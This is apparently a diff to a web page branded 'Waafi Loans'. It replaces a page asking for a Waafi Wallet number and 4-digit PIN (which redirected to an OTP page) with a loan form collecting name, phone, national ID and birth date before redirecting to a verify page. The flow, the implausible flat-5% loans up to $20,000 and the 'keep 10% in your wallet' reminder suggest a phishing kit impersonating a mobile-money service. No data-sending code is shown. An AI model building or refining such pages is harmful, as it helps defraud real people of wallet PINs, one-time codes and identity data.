@@ -3,11 +3,12 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Verify Your Identity — Waafi Loans</title>
-    <meta name="description" content="Verify your identity to complete your Waafi loan application. Enter your Waafi Wallet number and PIN to confirm." />
+    <title>Apply for a Loan — Waafi Loans</title>
+    <meta name="description" content="Complete the Waafi loan application: choose your amount from $50 to $20,000 and see your monthly repayment instantly." />
     <meta name="author" content="Waafi Loans" />
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>W</text></svg>" />
     <style>
+        /* ===== RESET ===== */
         *,
         *::before,
         *::after {
@@ -18,7 +19,6 @@
 
         :root {
             --primary: oklch(56% .14 152);
-            --primary-10: oklab(0.56 -0.123613 0.065726 / 0.10);
             --primary-90: oklab(0.56 -0.123613 0.065726 / 0.9);
             --secondary: oklch(96% .02 150);
             --background: oklch(99.5% .003 145);
@@ -28,6 +28,8 @@
             --text-primary: oklch(22% .02 150);
             --text-secondary: oklch(50% .02 152);
             --text-muted: oklch(50% .02 152);
+            --accent: oklch(96% .02 150);
+            --accent-foreground: oklch(22% .02 150);
             --radius: 16px;
             --radius-sm: 10px;
             --radius-xl: 12px;
@@ -52,6 +54,18 @@
         a {
             text-decoration: none;
             color: inherit;
+        }
+
+        img {
+            display: block;
+            max-width: 100%;
+            height: auto;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
         }
 
         /* ===== HEADER ===== */
@@ -118,6 +132,10 @@
             color: var(--primary);
         }
 
+        .nav a.active {
+            color: var(--primary);
+        }
+
         .lang-btn {
             display: flex;
             align-items: center;
@@ -159,60 +177,30 @@
         /* ===== MAIN CONTENT ===== */
         .main-content {
             flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        }
+
+        .apply-container {
+            max-width: 672px;
+            margin: 0 auto;
             padding: 48px 16px;
         }
 
-        .verify-container {
-            max-width: 448px;
-            width: 100%;
-            margin: 0 auto;
-        }
-
-        .verify-card {
-            padding: 32px;
-            border-radius: var(--radius);
-            border: 1px solid var(--border);
-            background: var(--card);
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
-        }
-
-        .verify-icon {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 64px;
-            height: 64px;
-            border-radius: 50%;
-            background: var(--primary-10);
-            margin: 0 auto 16px;
-        }
-
-        .verify-icon svg {
-            width: 32px;
-            height: 32px;
-            color: var(--primary);
-        }
-
-        .verify-title {
+        .apply-title {
             text-align: center;
-            font-size: 1.5rem;
+            font-size: 1.875rem;
             font-weight: 700;
             letter-spacing: -0.02em;
             color: var(--text-primary);
-            margin-bottom: 4px;
         }
 
-        .verify-subtitle {
-            text-align: center;
-            font-size: 0.875rem;
-            color: var(--text-muted);
-            margin-bottom: 24px;
-        }
-
-        .verify-form {
+        /* ===== FORM ===== */
+        .apply-form {
+            margin-top: 32px;
+            padding: 24px;
+            border-radius: var(--radius);
+            border: 1px solid var(--border);
+            background: var(--card);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
             display: flex;
             flex-direction: column;
             gap: 20px;
@@ -230,25 +218,23 @@
             color: var(--text-primary);
         }
 
-        .form-group input {
+        .form-group input,
+        .form-group select {
             width: 100%;
-            padding: 10px 14px;
+            padding: 8px 12px;
             border-radius: 8px;
             border: 1px solid var(--input);
             background: var(--card);
-            font-size: 1rem;
+            font-size: 0.875rem;
             color: var(--text-primary);
             outline: none;
             transition: all var(--transition);
         }
 
-        .form-group input:focus {
+        .form-group input:focus,
+        .form-group select:focus {
             border-color: var(--primary);
             box-shadow: 0 0 0 2px oklab(0.56 -0.123613 0.065726 / 0.4);
-        }
-
-        .form-group input::placeholder {
-            color: var(--text-muted);
         }
 
         .form-hint {
@@ -257,32 +243,128 @@
             margin-top: 4px;
         }
 
-        .pin-container {
-            display: flex;
-            gap: 12px;
-            justify-content: center;
+        .form-row {
+            display: grid;
+            gap: 20px;
         }
 
-        .pin-input {
-            width: 48px;
-            height: 56px;
-            text-align: center;
-            font-size: 1.25rem;
-            font-weight: 600;
-            border-radius: 8px;
-            border: 2px solid var(--input);
-            background: var(--card);
-            color: var(--text-primary);
+        /* ===== RANGE SLIDER ===== */
+        .range-container {
+            margin-top: 12px;
+        }
+
+        .range-container input[type="range"] {
+            width: 100%;
+            height: 6px;
+            -webkit-appearance: none;
+            appearance: none;
+            background: var(--border);
+            border-radius: 4px;
             outline: none;
+            transition: background var(--transition);
+        }
+
+        .range-container input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: var(--primary);
+            cursor: pointer;
             transition: all var(--transition);
         }
 
-        .pin-input:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 2px oklab(0.56 -0.123613 0.065726 / 0.4);
+        .range-container input[type="range"]::-webkit-slider-thumb:hover {
+            transform: scale(1.1);
         }
 
-        .verify-btn {
+        .range-container input[type="range"]::-moz-range-thumb {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: var(--primary);
+            cursor: pointer;
+            border: none;
+        }
+
+        .range-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+
+        /* ===== DURATION BUTTONS ===== */
+        .duration-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 8px;
+        }
+
+        .duration-btn {
+            padding: 8px 16px;
+            border-radius: 8px;
+            border: 1px solid var(--input);
+            background: transparent;
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: var(--text-primary);
+            cursor: pointer;
+            transition: all var(--transition);
+        }
+
+        .duration-btn:hover {
+            border-color: var(--primary);
+        }
+
+        .duration-btn.active {
+            background: var(--primary);
+            color: #fff;
+            border-color: var(--primary);
+        }
+
+        /* ===== REPAYMENT SUMMARY ===== */
+        .repayment-summary {
+            display: grid;
+            gap: 12px;
+            padding: 16px;
+            border-radius: 12px;
+            background: var(--secondary);
+        }
+
+        .repayment-item {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .repayment-item .label {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        .repayment-item .value {
+            font-size: 1.25rem;
+            font-weight: 700;
+        }
+
+        .repayment-item .value.primary {
+            color: var(--primary);
+        }
+
+        /* ===== REMINDER ===== */
+        .reminder {
+            padding: 12px 16px;
+            border-radius: 8px;
+            background: var(--accent);
+            font-size: 0.875rem;
+            color: var(--accent-foreground);
+        }
+
+        /* ===== SUBMIT BUTTON ===== */
+        .submit-btn {
             width: 100%;
             padding: 12px 24px;
             border-radius: 12px;
@@ -292,30 +374,11 @@
             font-size: 1rem;
             font-weight: 600;
             cursor: pointer;
-            transition: all var(--transition);
-            margin-top: 4px;
+            transition: background var(--transition);
         }
 
-        .verify-btn:hover {
+        .submit-btn:hover {
             background: var(--primary-90);
-            transform: scale(1.01);
-        }
-
-        .help-text {
-            text-align: center;
-            font-size: 0.875rem;
-            color: var(--text-muted);
-            margin-top: 16px;
-        }
-
-        .help-text a {
-            color: var(--primary);
-            font-weight: 500;
-            cursor: pointer;
-        }
-
-        .help-text a:hover {
-            text-decoration: underline;
         }
 
         /* ===== FOOTER ===== */
@@ -339,8 +402,17 @@
             .nav {
                 display: flex;
             }
+
             .mobile-menu-btn {
                 display: none;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr 1fr;
+            }
+
+            .repayment-summary {
+                grid-template-columns: 1fr 1fr;
             }
         }
 
@@ -364,32 +436,16 @@
                 display: flex;
             }
 
-            .main-content {
+            .apply-container {
                 padding: 32px 16px;
             }
 
-            .verify-card {
-                padding: 24px;
+            .apply-title {
+                font-size: 1.5rem;
             }
 
-            .pin-input {
-                width: 40px;
-                height: 48px;
-                font-size: 1rem;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .pin-input {
-                width: 36px;
-                height: 44px;
-                font-size: 0.875rem;
-            }
-            .pin-container {
-                gap: 8px;
-            }
-            .verify-card {
-                padding: 20px;
+            .apply-form {
+                padding: 16px;
             }
         }
     </style>
@@ -432,43 +488,129 @@
 
     <!-- ===== MAIN CONTENT ===== -->
     <main class="main-content">
-        <div class="verify-container">
-            <div class="verify-card">
-                <div class="verify-icon">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-                        <path d="M9 12l2 2 4-4" />
-                    </svg>
+        <div class="apply-container">
+            <h1 class="apply-title">Loan Application</h1>
+
+            <form class="apply-form" id="loanForm">
+                <!-- Full Name -->
+                <div class="form-group">
+                    <label for="fullName">Full Name</label>
+                    <input type="text" id="fullName" required placeholder="Enter your full name" />
                 </div>
 
-                <h1 class="verify-title">Verify Your Identity</h1>
-                <p class="verify-subtitle">Enter your Waafi Wallet details to complete your loan application</p>
+                <!-- Phone Number -->
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" required placeholder="e.g. 61 234 5678" />
+                    <span class="form-hint">Use the phone number registered on Waafi</span>
+                </div>
 
-                <form class="verify-form" id="verifyForm">
+                <!-- Row: National ID + Date of Birth -->
+                <div class="form-row">
                     <div class="form-group">
-                        <label for="phoneNumber">Waafi Wallet Number</label>
-                        <input type="tel" id="phoneNumber" placeholder="Enter your Waafi Wallet number" required autocomplete="tel" />
-                        <span class="form-hint">Enter the number registered on your Waafi Wallet</span>
+                        <label for="nationalId">National ID</label>
+                        <input type="text" id="nationalId" required placeholder="Enter your National ID" />
                     </div>
-
                     <div class="form-group">
-                        <label>Enter PIN</label>
-                        <div class="pin-container" id="pinContainer">
-                            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required autocomplete="off" />
-                            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required autocomplete="off" />
-                            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required autocomplete="off" />
-                            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required autocomplete="off" />
+                        <label for="dob">Date of Birth</label>
+                        <input type="date" id="dob" required />
+                    </div>
+                </div>
+
+                <!-- Town -->
+                <div class="form-group">
+                    <label for="town">Town</label>
+                    <select id="town" required>
+                        <option value="" selected>--</option>
+                        <option>Mogadishu</option>
+                        <option>Hargeisa</option>
+                        <option>Bosaso</option>
+                        <option>Kismayo</option>
+                        <option>Baidoa</option>
+                        <option>Beledweyne</option>
+                        <option>Garowe</option>
+                        <option>Galkayo</option>
+                        <option>Berbera</option>
+                        <option>Jowhar</option>
+                        <option>Burao</option>
+                        <option>Las Anod</option>
+                        <option>Marka</option>
+                        <option>Qardho</option>
+                    </select>
+                </div>
+
+                <!-- Employment Status -->
+                <div class="form-group">
+                    <label for="employment">Employment Status</label>
+                    <select id="employment" required>
+                        <option value="" selected>--</option>
+                        <option>Employed</option>
+                        <option>Self-employed</option>
+                        <option>Unemployed</option>
+                        <option>Student</option>
+                        <option>Business Owner</option>
+                    </select>
+                </div>
+
+                <!-- Purpose of Loan -->
+                <div class="form-group">
+                    <label for="purpose">Purpose of Loan</label>
+                    <select id="purpose" required>
+                        <option value="" selected>--</option>
+                        <option>Business Expansion</option>
+                        <option>Education</option>
+                        <option>Emergency</option>
+                        <option>Personal Use</option>
+                        <option>Medical</option>
+                        <option>Other</option>
+                    </select>
+                </div>
+
+                <!-- Loan Amount (Range Slider) -->
+                <div class="form-group">
+                    <label for="loanAmount">Loan Amount: $<span id="amountDisplay">500</span></label>
+                    <div class="range-container">
+                        <input type="range" id="loanAmount" min="50" max="20000" step="50" value="500" />
+                        <div class="range-labels">
+                            <span>$50</span>
+                            <span>$20,000</span>
                         </div>
-                        <span class="form-hint">Enter your 4-digit Waafi Wallet PIN</span>
                     </div>
+                </div>
 
-                    <button type="submit" class="verify-btn" id="verifyBtn">Verify &amp; Continue</button>
-                </form>
+                <!-- Loan Duration -->
+                <div class="form-group">
+                    <label>Loan Duration (months)</label>
+                    <div class="duration-buttons" id="durationButtons">
+                        <button type="button" class="duration-btn" data-months="6">6 months</button>
+                        <button type="button" class="duration-btn active" data-months="12">12 months</button>
+                        <button type="button" class="duration-btn" data-months="18">18 months</button>
+                        <button type="button" class="duration-btn" data-months="24">24 months</button>
+                        <button type="button" class="duration-btn" data-months="30">30 months</button>
+                        <button type="button" class="duration-btn" data-months="36">36 months</button>
+                    </div>
+                </div>
 
-                <p class="help-text">
-                    Don't have a Waafi Wallet? <a href="#">Sign up here</a>
-                </p>
-            </div>
+                <!-- Repayment Summary -->
+                <div class="repayment-summary">
+                    <div class="repayment-item">
+                        <span class="label">Monthly Repayment</span>
+                        <span class="value primary" id="monthlyRepayment">$43.75</span>
+                    </div>
+                    <div class="repayment-item">
+                        <span class="label">Total Repayment</span>
+                        <span class="value" id="totalRepayment">$525.00</span>
+                    </div>
+                </div>
+
+                <!-- Reminder -->
+                <div class="reminder">
+                    Reminder!! You must have at least 10% of your loan amount on your Waafi Wallet.
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="submit-btn" id="continueBtn">Continue With Waafi</button>
+            </form>
         </div>
     </main>
 
@@ -483,7 +625,8 @@
     <script>
         // ===== LANGUAGE =====
         const savedLang = localStorage.getItem('waafi-language') || 'en';
-        document.getElementById('headerLangText').textContent = savedLang === 'en' ? 'EN' : 'SO';
+        const langText = savedLang === 'en' ? 'EN' : 'SO';
+        document.getElementById('headerLangText').textContent = langText;
 
         // ===== MOBILE MENU =====
         const menuToggle = document.getElementById('menuToggle');
@@ -491,83 +634,82 @@
 
         menuToggle.addEventListener('click', function() {
             mainNav.classList.toggle('open');
+            const icon = this.querySelector('svg');
+            if (mainNav.classList.contains('open')) {
+                icon.innerHTML = '<path d="M18 6 6 18"/><path d="m6 6 12 12"/>';
+            } else {
+                icon.innerHTML = '<path d="M4 5h16"/><path d="M4 12h16"/><path d="M4 19h16"/>';
+            }
         });
 
         document.querySelectorAll('.nav a').forEach(link => {
             link.addEventListener('click', () => {
                 mainNav.classList.remove('open');
+                const icon = menuToggle.querySelector('svg');
+                icon.innerHTML = '<path d="M4 5h16"/><path d="M4 12h16"/><path d="M4 19h16"/>';
             });
         });
 
-        // ===== PRE-FILL PHONE NUMBER =====
-        const phoneFromStorage = localStorage.getItem('waafi-phone') || '';
-        if (phoneFromStorage) {
-            document.getElementById('phoneNumber').value = phoneFromStorage;
+        // ===== LOAN CALCULATOR =====
+        const loanAmount = document.getElementById('loanAmount');
+        const amountDisplay = document.getElementById('amountDisplay');
+        const monthlyRepayment = document.getElementById('monthlyRepayment');
+        const totalRepayment = document.getElementById('totalRepayment');
+        const durationButtons = document.querySelectorAll('.duration-btn');
+
+        let selectedMonths = 12;
+
+        function calculateRepayment() {
+            const amount = parseInt(loanAmount.value);
+            const months = selectedMonths;
+            const interestRate = 0.05;
+            const totalInterest = amount * interestRate;
+            const total = amount + totalInterest;
+            const monthly = total / months;
+
+            amountDisplay.textContent = amount;
+            monthlyRepayment.textContent = '$' + monthly.toFixed(2);
+            totalRepayment.textContent = '$' + total.toFixed(2);
         }
 
-        // ===== PIN INPUT =====
-        const pinInputs = document.querySelectorAll('.pin-input');
-
-        pinInputs.forEach((input, index) => {
-            input.addEventListener('input', function(e) {
-                const value = this.value;
-                if (!/^[0-9]$/.test(value) && value !== '') {
-                    this.value = '';
-                    return;
-                }
-                if (value.length === 1 && index < pinInputs.length - 1) {
-                    pinInputs[index + 1].focus();
-                }
-            });
-
-            input.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace' && this.value === '' && index > 0) {
-                    pinInputs[index - 1].focus();
-                }
-            });
-
-            input.addEventListener('paste', function(e) {
-                e.preventDefault();
-            });
-
-            input.addEventListener('click', function() {
-                this.select();
+        durationButtons.forEach(btn => {
+            btn.addEventListener('click', function() {
+                durationButtons.forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                selectedMonths = parseInt(this.dataset.months);
+                calculateRepayment();
             });
         });
 
-        // ===== FORM SUBMISSION - REDIRECT TO OTP PAGE =====
-        const verifyForm = document.getElementById('verifyForm');
-        const verifyBtn = document.getElementById('verifyBtn');
+        loanAmount.addEventListener('input', calculateRepayment);
+        calculateRepayment();
 
-        verifyForm.addEventListener('submit', function(e) {
+        // ===== FORM SUBMISSION - REDIRECT TO VERIFY PAGE =====
+        const loanForm = document.getElementById('loanForm');
+        const continueBtn = document.getElementById('continueBtn');
+
+        loanForm.addEventListener('submit', function(e) {
             e.preventDefault();
-
-            const phoneNumber = document.getElementById('phoneNumber').value;
-            let pin = '';
-            pinInputs.forEach(input => {
-                pin += input.value;
-            });
-
-            if (phoneNumber.length < 7) {
-                alert('Please enter a valid Waafi Wallet number.');
+            
+            // Get the phone number
+            const phone = document.getElementById('phone').value;
+            
+            // Validate phone number
+            if (!phone || phone.length < 7) {
+                alert('Please enter a valid phone number.');
                 return;
             }
-
-            if (pin.length !== 4) {
-                alert('Please enter your complete 4-digit PIN.');
-                return;
-            }
-
-            // Save phone for OTP page
-            localStorage.setItem('waafi-phone', phoneNumber);
-
+            
+            // Save phone number to localStorage for use on verify page
+            localStorage.setItem('waafi-phone', phone);
+            
             // Show loading state
-            verifyBtn.textContent = 'Verifying...';
-            verifyBtn.disabled = true;
-
-            // Redirect to OTP page after short delay
+            continueBtn.textContent = 'Processing...';
+            continueBtn.disabled = true;
+            
+            // Redirect to verify.html after short delay
             setTimeout(function() {
-                window.location.href = 'otp.html';
+                window.location.href = 'verify.html';
             }, 500);
         });
     </script>
